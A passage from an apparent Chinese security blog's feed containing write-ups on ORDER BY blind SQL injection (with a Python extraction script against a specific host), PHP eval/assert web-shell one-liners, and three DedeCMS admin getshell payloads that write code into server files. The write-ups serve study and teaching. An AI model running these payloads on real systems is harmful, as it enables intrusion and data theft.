serialize($test);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://xz.aliyun.com/t/3674" target="_blank" rel="noopener">https://xz.aliyun.com/t/3674</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近遇到很多反序列化的例子，这里决定重温一下加深对反序列化的理解&lt;/p&gt;
&lt;h2 id=&quot;PHP序列化是什么&quot;&gt;&lt;a href=&quot;#PHP序
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>记一次order by盲注</title>
    <link href="http://yoursite.com/2019/11/06/order%20by/"/>
    <id>http://yoursite.com/2019/11/06/order%20by/</id>
    <published>2019-11-06T15:48:43.214Z</published>
    <updated>2019-11-06T15:48:43.225Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>最近打一场小比赛遇到了order by盲注，这里记录一下原理</p><h2 id="order-by盲注"><a href="#order-by盲注" class="headerlink" title="order by盲注"></a>order by盲注</h2><p>首先有如下表</p><p><img src="https://s2.ax1x.com/2019/10/30/KhlQDs.png" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;5&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">|    1 | 2        | 5                                |</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;6&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|    1 | 2        | 6                                |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;51&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">|    1 | 2        | 51                               |</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br><span class="line"></span><br><span class="line">mysql&gt; select * from user where username=&apos;&apos; or 1 union select 1,2,&apos;52&apos; order by 3;</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| id   | username | password                         |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">| NULL | admin    | 51b7a76d51e70b419f60d3473fb6f900 |</span><br><span class="line">|    1 | 2        | 52                               |</span><br><span class="line">+------+----------+----------------------------------+</span><br><span class="line">2 rows in set (0.00 sec)</span><br></pre></td></tr></table></figure><p>通过逐位判断便可得到password</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://120.55.43.255:13004/login.php"</span></span><br><span class="line">str_1 = <span class="string">'0123456789abcdefghijklmnopqrstuvwxyz'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">40</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> str_1:</span><br><span class="line">        payload = <span class="string">"' or 1 union select 1,'test','%s%s' order by 3#"</span>%(flag,s)</span><br><span class="line">        <span class="comment"># print payload</span></span><br><span class="line">        data = &#123;<span class="string">'username'</span>:<span class="string">'%s'</span>%(payload),<span class="string">'passwd'</span>: <span class="string">'1'</span>&#125;</span><br><span class="line">        r = requests.post(url=url,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'test'</span> <span class="keyword">not</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="keyword">if</span> ord(s) == <span class="number">97</span>:</span><br><span class="line">                flag += chr(<span class="number">57</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                flag += chr(ord(s)<span class="number">-1</span>)</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://www.cnblogs.com/xishaonian/p/7703486.html" target="_blank" rel="noopener">https://www.cnblogs.com/xishaonian/p/7703486.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;最近打一场小比赛遇到了order by盲注，这里记录一下原理&lt;/p&gt;
&lt;h2 id=&quot;order-by盲注&quot;&gt;&lt;a href=&quot;#order
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>eval and assert</title>
    <link href="http://yoursite.com/2019/10/17/eval%E4%B8%8Eassert/"/>
    <id>http://yoursite.com/2019/10/17/eval%E4%B8%8Eassert/</id>
    <published>2019-10-17T12:49:22.947Z</published>
    <updated>2019-10-17T12:49:22.947Z</updated>
    
    <content type="html"><![CDATA[<p>先知社区看到一篇文章<a href="https://xz.aliyun.com/t/6511" target="_blank" rel="noopener">https://xz.aliyun.com/t/6511</a></p><p>感觉自己最近也对eval与assert的区别有些迷，便学习了一下</p><h2 id="eval与assert"><a href="#eval与assert" class="headerlink" title="eval与assert"></a>eval与assert</h2><p>eval与assert官方手册分别为:</p><p><a href="http://php.net/manual/zh/function.eval.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.eval.php</a></p><p><a href="http://php.net/manual/zh/function.assert.php" target="_blank" rel="noopener">http://php.net/manual/zh/function.assert.php</a></p><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><p>eval — 把字符串作为PHP代码执行</p><p>eval是一个语言构造器而不是一个函数，不能被 <a href="https://www.php.net/manual/zh/functions.variable-functions.php" target="_blank" rel="noopener">可变函数</a> 调用。</p><p>PHP可变函数：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PHP 支持可变函数的概念。这意味着如果一个变量名后有圆括号，PHP 将寻找与变量的值同名的函数，并且尝试执行它。</span><br><span class="line"></span><br><span class="line">可变函数不能用于例如 echo，print，unset()，isset()，empty()，include，require 以及类似的语言结构。需要使用自己的包装函数来将这些结构用作可变函数。</span><br></pre></td></tr></table></figure></p><p>这里有一段代码可测试是函数还是语言构造器<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span><span class="params">($name)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(function_exists($name))&#123;        <span class="keyword">echo</span> $name.<span class="string">'为函数'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;        <span class="keyword">echo</span> $name.<span class="string">'为语言结构'</span>;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">check(<span class="string">'xxxx'</span>);</span><br></pre></td></tr></table></figure></p><p>也就是说可变函数不能用于语言构造器，代码示例：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$test = $_GET[<span class="string">'test'</span>];</span><br><span class="line">$test($_GET[<span class="string">'cmd'</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>测试了一下，在php5中<br><img src="https://s2.ax1x.com/2019/10/17/KAXouQ.png" alt="image"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_POST[<span class="string">'1'</span>]($_POST[<span class="string">'2'</span>]);</span><br></pre></td></tr></table></figure><p>同样这段代码也是一个相同原理</p><p>assert可以，但eval不可以。</p><p>但在php7中，都不可以，在PHP7中assert变成了一种语言结构而不是一个函数。</p><h2 id="assert-php5-and-php7"><a href="#assert-php5-and-php7" class="headerlink" title="assert(php5 and php7)"></a>assert(php5 and php7)</h2><p><img src="https://s2.ax1x.com/2019/10/17/KESz7Q.png" alt="image"></p><p>刚刚也说到了assert的不同版本的特性</p><h2 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h2><p>eval函数中参数是字符</p><p>assert函数中参数为表达式 （或者为函数）</p><p>php5-&gt;php7中,assert变成跟eval一样的语言结构</p><h2 id="进阶"><a href="#进阶" class="headerlink" title="进阶"></a>进阶</h2><p><a href="https://www.anquanke.com/post/id/173201/" target="_blank" rel="noopener">https://www.anquanke.com/post/id/173201/</a><br>这篇文章一道题有点意思可以分析一下</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">include</span> <span class="string">'flag.php'</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'code'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    $code=$_GET[<span class="string">'code'</span>];</span><br><span class="line">    <span class="keyword">if</span>(strlen($code)&gt;<span class="number">35</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"Long."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">"/[A-Za-z0-9_$]+/"</span>,$code))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"NO."</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>($code);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>eval还有一种特性</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'&lt;?php echo "Hi!"; ?&gt;'</span>); <span class="comment">//执行失败</span></span><br><span class="line"><span class="keyword">eval</span>(<span class="string">'echo "In PHP mode!"; ?&gt;In HTML mode!&lt;?php echo "Hi!";'</span>);<span class="comment">//执行正常</span></span><br></pre></td></tr></table></figure><p>php手册有一段讲到：<br><img src="https://s2.ax1x.com/2019/10/17/KEY6qf.png" alt="image"></p><p>也就是说，这个题目payload:?code=?&gt;&lt;?=<code>xxxxxxx</code>?&gt;</p><p>&lt;?php ?&gt; 这种叫长标签</p><p>&lt;?= ?&gt; 短标签（php的配置文件php.ini中有一个short_open_tag的值，需要开启，php7移除）</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="http://www.vuln.cn/8395" target="_blank" rel="noopener">http://www.vuln.cn/8395</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;先知社区看到一篇文章&lt;a href=&quot;https://xz.aliyun.com/t/6511&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://xz.aliyun.com/t/6511&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;感觉自己最近也对eval与asse
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>dedecms最新版后台三处getshell</title>
    <link href="http://yoursite.com/2019/10/14/dedecms5.7/"/>
    <id>http://yoursite.com/2019/10/14/dedecms5.7/</id>
    <published>2019-10-14T10:54:20.810Z</published>
    <updated>2019-10-14T10:54:20.811Z</updated>
    
    <content type="html"><![CDATA[<h2 id="dedecms后台getshell"><a href="#dedecms后台getshell" class="headerlink" title="dedecms后台getshell"></a>dedecms后台getshell</h2><h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>dedecms全局变量注册特性原理(在include/common.inc.php)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span>($_k == <span class="string">'nvarname'</span>) $&#123;$_k&#125; = $_v;</span><br><span class="line"><span class="keyword">else</span> $&#123;$_k&#125; = <span class="string">'123'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $_v;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>漏洞发生在dede/tql.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($action==<span class="string">'savetagfile'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    csrf_check();</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">"#^[a-z0-9_-]&#123;1,&#125;\.lib\.php$#i"</span>, $filename))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">'文件名不合法，不允许进行操作！'</span>, <span class="string">'-1'</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">require_once</span>(DEDEINC.<span class="string">'/oxwindow.class.php'</span>);</span><br><span class="line">    $tagname = preg_replace(<span class="string">"#\.lib\.php$#i"</span>, <span class="string">""</span>, $filename);</span><br><span class="line">    $content = stripslashes($content);</span><br><span class="line">    $truefile = DEDEINC.<span class="string">'/taglib/'</span>.$filename;</span><br><span class="line">    $fp = fopen($truefile, <span class="string">'w'</span>);</span><br><span class="line">    fwrite($fp, $content);</span><br><span class="line">    fclose($fp);</span><br></pre></td></tr></table></figure><p>首先因为dedecms全局变量注册的特性，这里的$filename和$content是可控的，然后文件名经过preg_match函数正则表达式的过滤，也就是以字母数字下划线开头，最后以.lib.php为结尾,不分大小写</p><p>然后是csrf_check()这个函数定义是(/dede/config.php)<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">csrf_check</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $token;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($token) || strcasecmp($token, $_SESSION[<span class="string">'token'</span>]) != <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'&lt;a href="http://bbs.dedecms.com/907721.html"&gt;DedeCMS:CSRF Token Check Failed!&lt;/a&gt;'</span>;</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>就是请求时需要token参数，这个参数在?action=upload中获得</p><p><img src="https://s2.ax1x.com/2019/10/10/u7kAit.png" alt="image"></p><p><img src="https://s2.ax1x.com/2019/10/10/u7el8I.png" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload:http://127.0.0.1/uploads/dede/tpl.php?action=savetagfile&amp;filename=test.lib.php&amp;content=%3C?php%20phpinfo();%20?%3E&amp;token=adaf26b4e811c8543e735c764c177d83</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/10/10/u7eB2q.png" alt="image"></p><h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>漏洞发生在dede/sys_verifies.php处<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ($action == <span class="string">'getfiles'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>($refiles))</span><br><span class="line">    &#123;</span><br><span class="line">        ShowMsg(<span class="string">"你没进行任何操作！"</span>,<span class="string">"sys_verifies.php"</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    $cacheFiles = DEDEDATA.<span class="string">'/modifytmp.inc'</span>;</span><br><span class="line">    $fp = fopen($cacheFiles, <span class="string">'w'</span>);</span><br><span class="line">    fwrite($fp, <span class="string">'&lt;'</span>.<span class="string">'?php'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    fwrite($fp, <span class="string">'$tmpdir = "'</span>.$tmpdir.<span class="string">'";'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    $dirs = <span class="keyword">array</span>();</span><br><span class="line">    $i = <span class="number">-1</span>;</span><br><span class="line">    $adminDir = preg_replace(<span class="string">"#(.*)[\/\\\\]#"</span>, <span class="string">""</span>, dirname(<span class="keyword">__FILE__</span>));</span><br><span class="line">    <span class="keyword">foreach</span>($refiles <span class="keyword">as</span> $filename)</span><br><span class="line">    &#123;</span><br><span class="line">        $filename = substr($filename,<span class="number">3</span>,strlen($filename)<span class="number">-3</span>);</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"#^dede/#i"</span>, $filename)) </span><br><span class="line">        &#123;</span><br><span class="line">            $curdir = GetDirName( preg_replace(<span class="string">"#^dede/#i"</span>, $adminDir.<span class="string">'/'</span>, $filename) );</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $curdir = GetDirName($filename);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>( !<span class="keyword">isset</span>($dirs[$curdir]) ) </span><br><span class="line">        &#123;   </span><br><span class="line">            $dirs[$curdir] = TestIsFileDir($curdir);</span><br><span class="line">        &#125;</span><br><span class="line">        $i++;</span><br><span class="line">        fwrite($fp, <span class="string">'$files['</span>.$i.<span class="string">'] = "'</span>.$filename.<span class="string">'";'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    fwrite($fp, <span class="string">'$fileConut = '</span>.$i.<span class="string">';'</span>.<span class="string">"\r\n"</span>);</span><br><span class="line">    fwrite($fp, <span class="string">'?'</span>.<span class="string">'&gt;'</span>);</span><br><span class="line">    fclose($fp);</span><br></pre></td></tr></table></figure></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite($fp, <span class="string">'$files['</span>.$i.<span class="string">'] = "'</span>.$filename.<span class="string">'";'</span>.<span class="string">"\r\n"</span>);</span><br></pre></td></tr></table></figure><p>关键在这一行，将数组$refiles的内容全部写入/data/modifytmp.inc中</p><p>payload：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/uploads/dede/sys_verifies.php?action=getfiles&amp;refiles[1]=\&quot;;eval($_GET[cmd]);//</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/10/11/uqMMLR.png" alt="image"><br><img src="https://s2.ax1x.com/2019/10/11/uqKHsA.png" alt="image"></p><h2 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h2><p>漏洞发生在stepselect_main.php文件中，?action=addenum_save</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($action==<span class="string">'addenum_save'</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($ename) || <span class="keyword">empty</span>($egroup)) </span><br><span class="line">    &#123;</span><br><span class="line">         Showmsg(<span class="string">"类别名称或组名称不能为空！"</span>,<span class="string">"-1"</span>);</span><br><span class="line">         <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>($issign == <span class="number">1</span> || $topvalue == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        $enames = explode(<span class="string">','</span>, $ename);</span><br><span class="line">        <span class="keyword">foreach</span>($enames <span class="keyword">as</span> $ename)</span><br><span class="line">        &#123;</span><br><span class="line">            $arr = $dsql-&gt;GetOne(<span class="string">"SELECT * FROM `#@__sys_enum` WHERE egroup='$egroup' AND (evalue MOD 500)=0 ORDER BY disorder DESC "</span>);</span><br><span class="line">            <span class="keyword">if</span>(!is_array($arr)) $disorder = $evalue = ($issign==<span class="number">1</span> ? <span class="number">1</span> : <span class="number">500</span>);</span><br><span class="line">            <span class="keyword">else</span> $disorder = $evalue = $arr[<span class="string">'disorder'</span>] + ($issign==<span class="number">1</span> ? <span class="number">1</span> : <span class="number">500</span>);</span><br><span class="line">                </span><br><span class="line">            $dsql-&gt;ExecuteNoneQuery(<span class="string">"INSERT INTO `#@__sys_enum`(`ename`,`evalue`,`egroup`,`disorder`,`issign`) </span></span><br><span class="line"><span class="string">                                    VALUES('$ename','$evalue','$egroup','$disorder','$issign'); "</span>); </span><br><span class="line">        &#125;</span><br><span class="line">        WriteEnumsCache($egroup);                                                          </span><br><span class="line">        ShowMsg(<span class="string">"成功添加枚举分类！"</span>.$dsql-&gt;GetError(), $ENV_GOBACK_URL);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure><p>WriteEnumsCache函数定义为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">WriteEnumsCache</span><span class="params">($egroup=<span class="string">''</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> $dsql;</span><br><span class="line">    $egroups = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">if</span>($egroup==<span class="string">''</span>) &#123;</span><br><span class="line">        $dsql-&gt;SetQuery(<span class="string">"SELECT egroup FROM `#@__sys_enum` GROUP BY egroup "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        $dsql-&gt;SetQuery(<span class="string">"SELECT egroup FROM `#@__sys_enum` WHERE egroup='$egroup' GROUP BY egroup "</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $dsql-&gt;Execute(<span class="string">'enum'</span>);</span><br><span class="line">    <span class="keyword">while</span>($nrow = $dsql-&gt;GetArray(<span class="string">'enum'</span>)) &#123;</span><br><span class="line">        $egroups[] = $nrow[<span class="string">'egroup'</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span>($egroups <span class="keyword">as</span> $egroup)</span><br><span class="line">    &#123;</span><br><span class="line">        $cachefile = DEDEDATA.<span class="string">'/enums/'</span>.$egroup.<span class="string">'.php'</span>;</span><br><span class="line">        $fp = fopen($cachefile,<span class="string">'w'</span>);</span><br><span class="line">        fwrite($fp,<span class="string">'&lt;'</span>.<span class="string">"?php\r\nglobal \$em_&#123;$egroup&#125;s;\r\n\$em_&#123;$egroup&#125;s = array();\r\n"</span>);</span><br><span class="line">        $dsql-&gt;SetQuery(<span class="string">"SELECT ename,evalue,issign FROM `#@__sys_enum` WHERE egroup='$egroup' ORDER BY disorder ASC, evalue ASC "</span>);</span><br><span class="line">        $dsql-&gt;Execute(<span class="string">'enum'</span>);</span><br><span class="line">        $issign = <span class="number">-1</span>;</span><br><span class="line">        $tenum = <span class="keyword">false</span>; <span class="comment">//三级联动标识</span></span><br><span class="line">        <span class="keyword">while</span>($nrow = $dsql-&gt;GetArray(<span class="string">'enum'</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            fwrite($fp,<span class="string">"\$em_&#123;$egroup&#125;s['&#123;$nrow['evalue']&#125;'] = '&#123;$nrow['ename']&#125;';\r\n"</span>);</span><br><span class="line">            <span class="keyword">if</span>($issign==<span class="number">-1</span>) $issign = $nrow[<span class="string">'issign'</span>];</span><br><span class="line">            <span class="keyword">if</span>($nrow[<span class="string">'issign'</span>]==<span class="number">2</span>) $tenum = <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> ($tenum) $dsql-&gt;ExecuteNoneQuery(<span class="string">"UPDATE `#@__stepselect` SET `issign`=2 WHERE egroup='$egroup'; 